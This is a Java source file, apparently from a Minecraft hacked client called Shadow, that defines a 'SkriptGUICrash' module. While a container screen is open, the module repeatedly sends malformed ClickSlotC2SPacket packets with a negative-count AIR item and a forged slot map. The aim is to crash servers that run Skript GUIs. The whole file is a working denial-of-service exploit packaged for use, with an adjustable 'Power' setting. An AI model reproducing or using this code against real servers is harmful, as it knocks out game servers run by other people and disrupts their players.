package net.shadow.feature.module;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import net.minecraft.client.gui.screen.ingame.GenericContainerScreen;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;

public class GUICrash extends Module {
    final SliderValue pwr = this.config.create("Power", 11, 1, 30, 0);
    public GUICrash() {
        super("SkriptGUICrash","Crashes with errorcrash with skript gui, have to open gui", ModuleType.CRASH);
    }



    @Override
    public void onUpdate() {
        if(Shadow.c.currentScreen instanceof GenericContainerScreen handler) {
            Int2ObjectMap<ItemStack> ripbozo = new Int2ObjectArrayMap<>();
            ripbozo.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
            for (int i = 0; i < pwr.getThis(); i++) {
                Shadow.c.player.networkHandler.sendPacket(
                        new ClickSlotC2SPacket(
                                Shadow.c.player.currentScreenHandler.syncId,
                                47,
                                47,
                                47,
                                SlotActionType.PICKUP,
                                new ItemStack(Items.AIR, -1),
                                ripbozo
                        )
                );
            }
        }
    }

    @Override
    public void onEnable() {

    }

    @Override
    public void onDisable() {

    }

    @Override
    public void onRender() {

    }
}
